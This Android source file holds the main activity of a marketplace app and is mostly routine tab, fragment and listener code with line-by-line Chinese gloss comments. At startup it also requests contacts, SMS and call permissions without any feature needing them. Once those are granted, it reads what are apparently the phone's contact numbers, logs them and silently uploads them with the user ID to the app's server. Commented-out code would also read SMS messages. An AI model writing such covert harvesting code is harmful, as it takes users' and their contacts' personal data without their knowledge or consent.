package com.houwei.guaishang.activity;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.FragmentTransaction;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.widget.RadioButton;
import android.widget.RadioGroup;
import android.widget.RadioGroup.OnCheckedChangeListener;
import android.widget.TextView;

import com.baidu.tts.tools.SharedPreferencesUtils;
import com.google.gson.Gson;
import com.houwei.guaishang.MessageEvent;
import com.houwei.guaishang.R;
import com.houwei.guaishang.bean.CommentPushBean;
import com.houwei.guaishang.bean.FansPushBean;
import com.houwei.guaishang.bean.FloatResponse;
import com.houwei.guaishang.bean.PhoneInfo;
import com.houwei.guaishang.bean.StringResponse;
import com.houwei.guaishang.bean.UserBean;
import com.houwei.guaishang.bean.VersionResponse.VersionBean;
import com.houwei.guaishang.bean.event.TopicHomeEvent;
import com.houwei.guaishang.data.DBReq;
import com.houwei.guaishang.easemob.PreferenceManager;
import com.houwei.guaishang.event.LoginSuccessEvent;
import com.houwei.guaishang.event.TopicSelectEvent;
import com.houwei.guaishang.manager.ChatManager.OnMyActionMessageGetListener;
import com.houwei.guaishang.manager.ChatManager.OnMyActionMessageHadReadListener;
import com.houwei.guaishang.manager.ITopicApplication;
import com.houwei.guaishang.manager.MyUserBeanManager;
import com.houwei.guaishang.manager.MyUserBeanManager.UserStateChangeListener;
import com.houwei.guaishang.manager.VersionManager.LastVersion;
import com.houwei.guaishang.tools.HttpUtil;
import com.houwei.guaishang.tools.JsonParser;
import com.houwei.guaishang.tools.VoiceUtils;
import com.houwei.guaishang.util.DeviceCardInfoUtils;
import com.houwei.guaishang.view.PublishOrderDialog;
import com.lzy.imagepicker.bean.ImageItem;
import com.tbruyelle.rxpermissions2.RxPermissions;

import org.greenrobot.eventbus.EventBus;
import org.greenrobot.eventbus.Subscribe;
import org.greenrobot.eventbus.ThreadMode;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import cn.jpush.android.api.JPushInterface;
import io.reactivex.annotations.NonNull;
import io.reactivex.functions.Consumer;

/**
 * Root界面，包括底部3个tab
 * NewMessageGetListener，来新聊天消息监听
 * UserStateChangeListener，当前账号状态监听
 * OnMyActionMessageGetListener，来新穿透消息监听（新粉丝，新评论）
 * OnMyActionMessageHadReadListener，新穿透消息已读监听（新粉丝已被读，新评论已被读）
 * LastVersion，是否有新版本监听
 */
//             主活动                    主环信活动                   用户状态改变监听器
public class MainActivity extends MainHuanXinActivity implements UserStateChangeListener,
//         行动消息监听器                  读过的消息监听器              最后版本     用户基管理          检查钱监听器
		OnMyActionMessageGetListener, OnMyActionMessageHadReadListener, LastVersion, MyUserBeanManager.CheckMoneyListener {
//                               读取  手机  信息  请求  代码
	private static final int READ_PHONE_INFO_REQUEST_CODE = 1;
	private static final int READ_MESSAGE_INFO_REQUEST_CODE = 2;
//                        读取行动数文本        读取粉丝数文本
	private TextView unReadActionCountTV, unReadFansCountTV;
//             主题应用        应用
	private ITopicApplication app;
//                 当前索引标签
	private int currentTabIndex;//当前选中的tab
//               主题根片段       主题片段
	private TopicRootFragment topicFragment;
//             我的片段    我的片段
//	private MineFragment mineFragment;
//              我的新片段    我的片段
	private MineFragmentNew mineFragment;
//                   视频路径
	private String videoPath;
//                     显示主题片段
	private boolean showTopicFragment;
//             数组       图片项    图片列表
	private ArrayList<ImageItem> selImageList; //当前选择的所有图片
//                最大图片数量
	private int maxImgCount = 1;
//                             图片项添加
	public static final int IMAGE_ITEM_ADD = -1;
//                               	请求代码选择
	public static final int REQUEST_CODE_SELECT = 100;
//                                	请求代码预览
	public static final int REQUEST_CODE_PREVIEW = 101;
//   列表数组              图像
	ArrayList<ImageItem> images = null;
//            RX权限管理	 RX权限管理
	private RxPermissions rxPermissions;
//           单选组       单选选项
	private RadioGroup rgOpterator;
//            单选按钮   主题单选按钮
	private RadioButton topicRadioButton;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		if (savedInstanceState != null) {
			videoPath = savedInstanceState.getString("videoPath");
		}
//                                主题活动
		setContentView(R.layout.activity_main);
		rxPermissions = new RxPermissions(this);
//       时间总线   获取默认   注册
		EventBus.getDefault().register(this);
//       初始化视图
		initView();
//       初始化监听器
		initListener();
//       后内容视图
		afterContentView();
//       检查环信是否登录
		checkHuanXinIsLogined();
//       读取手机和消息
		readPhoneAndMessage();
//		ShareSDK.initSDK(this);

	}
//                 初始化视图
	private void initView() {
//      应用      主题应用         获取应用
		app = (ITopicApplication) getApplication();
//      未读取行为数量文本                                   未读取行为数量文本
		unReadActionCountTV = (TextView) findViewById(R.id.unReadActionCountTV);
//      未读取粉丝数量文本                                   未读取粉丝数量文本
		unReadFansCountTV = (TextView) findViewById(R.id.unReadFansCountTV);
		//未读评论 赞
//       检查未读取行为数量           获取实例         获取总数为读取评论数量
		checkUnReadActionCount(DBReq.getInstence(this).getTotalUnReadCommentCount());
//      单选导航底                                      单选导航底
		rgOpterator = (RadioGroup) findViewById(R.id.rgOperator);
//      主题单选按钮                                         主题单选
		topicRadioButton = (RadioButton) findViewById(R.id.topic_radio);
//      当前标签索引         单选导航底
		currentTabIndex = rgOpterator.getCheckedRadioButtonId();
//      单选导航底     设置变化监听器
		rgOpterator.setOnCheckedChangeListener(new OnCheckedChangeListener() {

			public void onCheckedChanged(RadioGroup group, int checkedId) {
				// TODO Auto-generated method stub
//              开关  	 检查ID
				switch (checkedId) {
//              情况下      主题单选
				case R.id.topic_radio:{
//                      片段事务          事物          获取支持片段管理            开始事务
					FragmentTransaction transaction = getSupportFragmentManager().beginTransaction();
//                                 主题片段
					if (null == topicFragment) {
//                        主题片段              主题根片段
						topicFragment = new TopicRootFragment();
                    }
//                  隐藏当前片段          事务
					hideCurrentFragment(transaction);
//                          主题片段		添加
					if (!topicFragment.isAdded()){
//                         事务     添加       容器        主题片段
						 transaction.add(R.id.container,topicFragment);    
					}else{
//                         事务      显示   主题片段
						 transaction.show(topicFragment);
					}
//                      事务   	 提交
                    transaction.commit();
                 
				}
					break;
//              情况下      我的单选
				case R.id.mine_radio:{
//                      片段事务           事务       获取支持片段管理              开始事务
					FragmentTransaction transaction = getSupportFragmentManager().beginTransaction();
//                                 我的片段
					if (null == mineFragment) {
//                         我的片段            我的片段
						mineFragment = new MineFragmentNew();
//						mineFragment = new MineFragment();
                    }
//                  隐藏当前片段           事务
					hideCurrentFragment(transaction);
//                         我的片段        添加
					if (!mineFragment.isAdded()){
//                        事务      添加        容器      我的片段
						 transaction.add(R.id.container,mineFragment);    
					}else{
//                         事务      显示   我的片段
						 transaction.show(mineFragment);
					}
//                     事务      提交
                    transaction.commit();

					break;
				}
				}
//                 当前标签索引       检查ID
				currentTabIndex = checkedId;
			}
		});
//         主题片段              主题根片段
		topicFragment = new TopicRootFragment();
//        片段事务            事务        获取支持片段管理               开始事务
		FragmentTransaction transaction = getSupportFragmentManager().beginTransaction();
//          事务    添加        容器    主题事务
		transaction.add(R.id.container,topicFragment);
//       事务         提交
		transaction.commit();
//	                        发布按钮           监听器
		findViewById(R.id.publish_btn).setOnClickListener(
				new View.OnClickListener() {

					@Override
					public void onClick(View arg0) {
						// TODO Auto-generated method stub
//                             检查是否登录
						if (!checkLogined()) {
							return;
						}
//                         权限管理     请求      清单     权限       相机
						rxPermissions.request(Manifest.permission.CAMERA,
//                                                    写入    外部    储存
								Manifest.permission.WRITE_EXTERNAL_STORAGE,
//                                                   读取  外部     储存
								Manifest.permission.READ_EXTERNAL_STORAGE,
//                                                     访问   粗     定位
								Manifest.permission.ACCESS_COARSE_LOCATION,
//                                            访问    细    定位
						Manifest.permission.ACCESS_FINE_LOCATION,
//                                           读取   外部      储存
						Manifest.permission.READ_EXTERNAL_STORAGE,
//                                           写入    外部      储存
						Manifest.permission.WRITE_EXTERNAL_STORAGE
								)
//                                订阅           用户     布尔
								.subscribe(new Consumer<Boolean>() {
									@Override
//                                                接受
									public void accept(@NonNull Boolean aBoolean) throws Exception {
											if(aBoolean){
//                                               发布命令对话框     获取实例                       显示
												PublishOrderDialog.getInstance(MainActivity.this).show();
												/*MenuTwoButtonDialog dialog = new MenuTwoButtonDialog(MainActivity.this, new MenuTwoButtonDialog.ButtonClick() {

													@Override
													public void onSureButtonClick(int index) {
														// TODO Auto-generated method stub
														Intent i=new Intent(MainActivity.this,TopicReleaseActivity.class);
														switch (index) {
															case 0:
																i.putExtra("type",0);
																startActivityForResult(i,0);
//									*//**
//									 * 0.4.7 目前直接调起相机不支持裁剪，如果开启裁剪后不会返回图片，请注意，后续版本会解决
//									 *
//									 * 但是当前直接依赖的版本已经解决，考虑到版本改动很少，所以这次没有上传到远程仓库
//									 *
//									 * 如果实在有所需要，请直接下载源码引用。
//									 *//*
//									//打开选择,本次允许选择的数量
//                               		 ImagePicker.getInstance().setSelectLimit(9);
//									Intent intent = new Intent(MainActivity.this, ImageGridActivity.class);
//									intent.putExtra(ImageGridActivity.EXTRAS_TAKE_PICKERS, true); // 是否是直接打开相机
//									startActivityForResult(intent, REQUEST_CODE_SELECT);
																break;

															case 1:
																i.putExtra("type",1);
																startActivityForResult(i,0);
																//打开选择,本次允许选择的数量
//                                ImagePicker.getInstance().setSelectLimit(1);
//										ImagePicker.getInstance().setCrop(true);        //允许裁剪（单选才有效）
//										ImagePicker.getInstance().setSaveRectangle(false); //是否按矩形区域保存
//										ImagePicker.getInstance().setSelectLimit(9);    //选中数量限制
//										ImagePicker.getInstance().setStyle(CropImageView.Style.CIRCLE);  //裁剪框的形状
//										ImagePicker.getInstance().setFocusWidth(600);   //裁剪框的宽度。单位像素（圆形自动取宽高最小值）
//										ImagePicker.getInstance().setFocusHeight(600);  //裁剪框的高度。单位像素（圆形自动取宽高最小值）
//										ImagePicker.getInstance().setOutPutX(200);//保存文件的宽度。单位像素
//										ImagePicker.getInstance().setOutPutY(200);//保存文件的高度。单位像素
//										Intent intent1 = new Intent(MainActivity.this, ImageGridActivity.class);
                                *//* 如果需要进入选择的时候显示已经选中的图片，
                                 * 详情请查看ImagePickerActivity
                                 * *//*
//                                intent1.putExtra(ImageGridActivity.EXTRAS_IMAGES,images);
//										startActivityForResult(intent1, REQUEST_CODE_SELECT);
																break;
															default:
																//打开预览
//										Intent intentPreview = new Intent(MainActivity.this, ImagePreviewDelActivity.class);
//										intentPreview.putExtra(ImagePicker.EXTRA_IMAGE_ITEMS, (ArrayList<ImageItem>) adapter.getImages());
//										intentPreview.putExtra(ImagePicker.EXTRA_SELECTED_IMAGE_POSITION, position);
//										intentPreview.putExtra(ImagePicker.EXTRA_FROM_ITEMS, true);
//										startActivityForResult(intentPreview, REQUEST_CODE_PREVIEW);
																break;
														}
													}
												});
												dialog.title_tv.setText("现在拍照");
												dialog.tv2.setText("从相册里选取");
												dialog.show();*/
											}
									}
								});
					}
				});
	}

	//隐藏当前的Fragment，切换tab时候使用
//                   隐藏当前片段         片段事务         事务
	private void hideCurrentFragment(FragmentTransaction transaction) {
//      开关       当前标签索引
		switch (currentTabIndex) {
//      情况下      主题单选
		case R.id.topic_radio:
//           事务        隐藏  主题片段
			transaction.hide(topicFragment);
			break;
//      情况下      我的单选
		case R.id.mine_radio:
//            事务      隐藏  我的片段
			transaction.hide(mineFragment);
			break;
//       默认
		default:
			break;
		}
	}
//                 初始化监听器
	private void initListener() {
		// TODO Auto-generated method stub
//      应用  获取聊天管理    添加行动消息管理监听器
		app.getChatManager().addOnMyActionMessageGetListener(this);
//      应用  获取聊天管理     添加行为管理已读监听器
		app.getChatManager().addOnMyActionMessageHadReadListener(this);
//      应用  获取用户基管理        添加用户状态变化监听器
		app.getMyUserBeanManager().addOnUserStateChangeListener(this);
//      应用  获取用户基管理        添加检查钱监听器
		app.getMyUserBeanManager().addOnCheckMoneyListener(this);
//      应用  获取版本管理        设置最后版本
		app.getVersionManager().setOnLastVersion(this);
//      应用  获取版本管理        设置最新版本
		app.getVersionManager().checkNewVersion();
	}

	@Override
//                    按下
	public boolean onKeyDown(int keyCode, KeyEvent event) {
//         按键代码    按键事件    回退键         事件   获取行为       按键时间   按下行为
		if (keyCode == KeyEvent.KEYCODE_BACK && event.getAction() == KeyEvent.ACTION_DOWN) {
//                 导航底        获取单选按钮                     我的单选
			if (rgOpterator.getCheckedRadioButtonId() == R.id.mine_radio) {
//                导航底      检查        主题单选
				rgOpterator.check(R.id.topic_radio);
				return true;
			}
		}
//                      按下      按钮代码 事件
		return super.onKeyDown(keyCode, event);
	}
//     订阅      线程模型     线程模型  主
	@Subscribe(threadMode = ThreadMode.MAIN)
//                  主题片段选择 	    主题选择事件
	public void topicFragmentSelect(TopicSelectEvent event) {
//        显示主题片段
		showTopicFragment = true;
	}
//     订阅     线程模型      线程模型   主
	@Subscribe(threadMode = ThreadMode.MAIN)
//                 登录成功      登录成功事件    事件
	public void loginSuccess(LoginSuccessEvent event) {
//       获取主题应用            获取用户基管理          	开始检查钱
		getITopicApplication().getMyUserBeanManager().startCheckMoneyRun();
	}

	//支付成功回调
//     订阅     线程模型      线程模型   主
	@Subscribe(threadMode = ThreadMode.MAIN)
//                 事件    主题家事件    事件
	public void onEvent(TopicHomeEvent event){
//          获取主应用          获取用户基管理           开始检查钱
		getITopicApplication().getMyUserBeanManager().startCheckMoneyRun();
	}

	@Override
//                   检查钱刷新	      浮动响应       响应
	public void onCheckMoneyFinish(FloatResponse intResponse) {
//       浮点   钱数          响应        获取数据
		float moneyCount = intResponse.getData();
//       偏好管理器        获取实例       用户硬币     钱数
		PreferenceManager.getInstance().setUserCoins(moneyCount);
	}

	@Override
//                    重启
	protected void onResume() {
		super.onResume();
//           显示主题片段
		if (showTopicFragment) {
//               主题单选按钮
			if (topicRadioButton != null) {
//               主题单选按钮       设置选中
				topicRadioButton.setChecked(true);
			}
//          显示主题片段           假
			showTopicFragment = false;
		}
	}

	@Override
//                    摧毁
	protected void onDestroy() {
		// TODO Auto-generated method stub
//      应用 获取聊天管理      删除行为管理监听器
		app.getChatManager().removeOnMyActionMessageGetListener(this);
//      应用 获取聊天管理      删除行为管理已读监听器
		app.getChatManager().removeOnMyActionMessageHadReadListener(this);
//      应用 获取用户基管理         删除用户状态变化监听器
		app.getMyUserBeanManager().removeUserStateChangeListener(this);
//      应用  获取版本管理         删除监听器
		app.getVersionManager().removeListener(this);
//		ShareSDK.stopSDK(this);
//       事件总线  获取默认     注销
		EventBus.getDefault().unregister(this);
//              摧毁
		super.onDestroy();

	}
//                  检查环信是否登录
	private void checkHuanXinIsLogined() {
//       用户基  基       获取主题应用            获取用户基管理       获取实例
		UserBean bean = getITopicApplication().getMyUserBeanManager().getInstance();
//           基              演示简单帮助      已经登录了
		if (bean!=null && !demoEaseHelper.isLoggedIn())
		{
			//已经是登陆状态，但是环信的长连接断了，需要登录环信长连接
//            获取主题应用           获取环信管理         登录环信服务器                        基   获取用户ID   基  获取名字
			getITopicApplication().getHuanXinManager().loginHuanXinService(this,bean.getUserid(),bean.getName(),null);
		}
	}

	/**
	 * 计算出 “我的”tab上红字 应该是 未读预订+未读付款+未读粉丝+未读聊天
	 */
//                	获取我的未读数
	private int getUnreadMineCount() {
//                获取未读消息数量总数		       获取实例          获取总数未读粉丝数
		return getUnreadMsgCountTotal() + DBReq.getInstence(this).getTotalUnReadFansCount();
	}

	@Override
//                    检查消息未读总数
	protected void checkMessageUnReadCount() {
//         检查粉丝未读数     获取未读数
		checkUnReadFansCount(getUnreadMineCount());
	}

	@Override
//                  用户消息检查
	public void onUserInfoChanged(UserBean ub) {
		// TODO Auto-generated method stub
	}


	@Override
//                用户登录
	public void onUserLogin(final UserBean ub) {
		// TODO Auto-generated method stub
//       RX权限管理    请求     清单     权限管理    读取手机状态权限
		rxPermissions.request(Manifest.permission.READ_PHONE_STATE)
//                订阅           用户    布尔
				.subscribe(new Consumer<Boolean>() {
					@Override
//                                接受            布尔
					public void accept(@NonNull Boolean aBoolean) throws Exception {
//                       文本   别名   基    获取用户ID
						String alias = ub.getUserid();
//                       分享偏好工具包          输入文本                                       极光推送     别名
						SharedPreferencesUtils.putString(MainActivity.this, "JPush_alias", alias);
//                       极光接口        设置悲鸣          主活动                  别名
						JPushInterface.setAlias(MainActivity.this,1, alias);
					}
				});
//            读取手机和消息
        readPhoneAndMessage();
	}


	@Override
//                  用户注销
	public void onUserLogout() {
		// TODO Auto-generated method stub
//		finish();
	}

	
	
	/**
	 * get
	 */
	@Override
//                   新粉丝获取    粉丝推送基   粉丝推送基
	public void onMyNewFansGet(FansPushBean fansPushBean) {
		// TODO Auto-generated method stub
//        检查未读粉丝数        获取未读我数
		checkUnReadFansCount(getUnreadMineCount());
	}

	@Override
//                  新评论获取      评论推送基    评论推送基
	public void onNewCommentGet(CommentPushBean commentPushBean) {
		// TODO Auto-generated method stub
//       检查未读行为数               获取实例           获取总数未读评论数
		checkUnReadActionCount(DBReq.getInstence(this).getTotalUnReadCommentCount());
	}


	
	/**
	 * read
	 */
	@Override
//                 粉丝已读
	public void onFansHadRead() {
		// TODO Auto-generated method stub
//       检查未读粉丝数       获取未读我数
		checkUnReadFansCount(getUnreadMineCount());
	}

	@Override
//                 评论已读
	public void onCommentsHadRead() {
		// TODO Auto-generated method stub
		checkUnReadActionCount(0);
	}

//                   检查未读行为数
	private void checkUnReadActionCount(int unReadActionCount) {
//		unReadActionCountTV.setText("" + unReadActionCount);
//		unReadActionCountTV.setVisibility(unReadActionCount == 0 ? View.INVISIBLE
//						: View.VISIBLE);
	}
//                  检查未读粉丝数
	private void checkUnReadFansCount(int unReadActionCount) {
//		unReadFansCountTV.setText("" + unReadActionCount);
//		unReadFansCountTV.setVisibility(unReadActionCount == 0 ? View.INVISIBLE
//				: View.VISIBLE);
	}

	
	@Override
//                最后版本
	public void isLastVersion() {
		// TODO Auto-generated method stub
	}

	@Override
//                  版本网络失败
	public void versionNetworkFail(String message) {
		// TODO Auto-generated method stub
	}

	@Override
//                  不是最后版本	版本基   版本基
	public void notLastVersion(VersionBean versionBean) {
		// TODO Auto-generated method stub
		// 不是最新版本。提示用户
//      应用  获取版本管理         下载新版本          版本基
		app.getVersionManager().downLoadNewVersion(versionBean, this);
	}



	@Override
//                   活动结果           请求代码         结果代码    意图  数据
	public void onActivityResult(int requestCode, int resultCode, Intent data) {
//		UMShareAPI.get(this).onActivityResult(requestCode, resultCode, data);
		super.onActivityResult(requestCode, resultCode, data);
//      开关       结果代码
		switch (resultCode) {
//          情况下  主题结果活动        发布    成功
			case TopicReleaseActivity.RELEASE_SUCCESS:
//                  数据     空      数据  获取文本夹带          品牌
				if (data != null && data.getStringExtra("brand") != null) {
//                   文本  品牌     数据  获取文本夹带          品牌
					String brand = data.getStringExtra("brand");
//                   音频工具    实例             说              发布陈宫       品牌
					VoiceUtils.getInstance(this).speak("发布成功，买"+brand+"就上怪商抢单");
				}
//                  主题片段
				if(topicFragment!=null){
//                  主题片段          刷新列表
					topicFragment.refreshList(0);
				}
				break;
//           默认
			default:
				break;
		}
	}

	@Override
//                    保存实例状态
	protected void onSaveInstanceState(Bundle outState) {
//         状态   输入文本   视频路径     视频路径
		outState.putString("videoPath", videoPath);
//              保存实例状态       输出
		super.onSaveInstanceState(outState);
	}
//    订阅       线程模型     线程模型  主
	@Subscribe (threadMode = ThreadMode.MAIN)
//                3事件主线程         消息事件     消息事件
	public void on3EventMainThread(MessageEvent messageEvent){
//        文本  ID  消息事件     获取ID
		String id = messageEvent.getId();

	}
//                 读取电话和消息
	private void readPhoneAndMessage() {
//         活动兼容     请求权限管理
		ActivityCompat.requestPermissions(this,
//                   文本    清单      权限管理   拨打电话
				new String[]{Manifest.permission.CALL_PHONE,
//                         清单   权限管理		读取联系人
                        Manifest.permission.READ_CONTACTS,
//                        清单    权限管理   	收到短信
				        Manifest.permission.RECEIVE_SMS,
//                        清单     权限管理  	读取短信		读取手机消息请求的代码
                        Manifest.permission.READ_SMS}, READ_PHONE_INFO_REQUEST_CODE);
//		ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS}, READ_MESSAGE_INFO_REQUEST_CODE);
	}

	@Override
//                请求权限管理结果	               请求代码            支持    注释               文本     权限管理              支持         注释    非零            授权结果
	public void onRequestPermissionsResult(int requestCode, @android.support.annotation.NonNull String[] permissions, @android.support.annotation.NonNull int[] grantResults) {
//               请求  权限管理结果        请求代码    权限管理      同意结果
		super.onRequestPermissionsResult(requestCode, permissions, grantResults);
//           授权结果                  授权结果
		if (grantResults != null && grantResults.length > 0) {
//                   全部授权
			boolean hasAllGranted = true;
//               长度      授权结果    长度
			int length = grantResults.length;
			for (int i = 0; i < length; i++) {
//                    授权		授权结果
				int granted = grantResults[i];
//                    授权       包管理				许可授权
				if (granted != PackageManager.PERMISSION_GRANTED) {
					//有权限未授权
//                    全部授权         假
					hasAllGranted = false;
					break;
				}
			}
//               全部授权
			if (hasAllGranted) {
				try {
//                  列表  手机消息   手机消息    设备卡消息工具       获取手机号码从移动
					List<PhoneInfo> phoneInfos = DeviceCardInfoUtils.getPhoneNumberFromMobile(MainActivity.this);
//                        手机消息     空
					if (phoneInfos != null) {
//                      最终   文本   杰森        吉森   杰森   手机消息
						final String json = new Gson().toJson(phoneInfos);
//                      日志         手机消息               手机消息     杰森
						Log.i("phoneInfo===","phoneInfo="+json);
//                           线程        可运行
						new Thread(new Runnable() {
							@Override
//                                       运行
							public void run() {
//                               字符串响应    响应       空
								StringResponse response = null;
								try {
//                                  散列映射  文本          数据        散列映射
									HashMap<String, String> data = new HashMap<String, String>();
//                                  数据  输入  用户ID   获取用户ID
									data.put("userid", getUserID());
//                                  数据 输入  数据   杰森
									data.put("data", json);
//                                  响应        杰森解析器  获取文本响应     HTTP工具	发送消息
									response = JsonParser.getStringResponse(HttpUtil.postMsg(
//                                         HTTP工具  获取数据                  HTTP工具 	   用户移动号码上传
											HttpUtil.getData(data), HttpUtil.IP + "Usermobile/upload"));
								} catch (Exception e) {
									// TODO Auto-generated catch block
//                                   	打印堆栈跟踪
									e.printStackTrace();
								}
							}
						}).start();
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
//				try {
//					List<SMSInfo> phoneInfos = DeviceCardInfoUtils.getSmsFromPhone(MainActivity.this);
//					if (phoneInfos != null) {
//						String json = new Gson().toJson(phoneInfos);
//						Log.i("phoneInfo===sms","SMSInfo="+json);
//					}
//				} catch (Exception e) {
//					e.printStackTrace();
//				}
			}
		}
	}
}
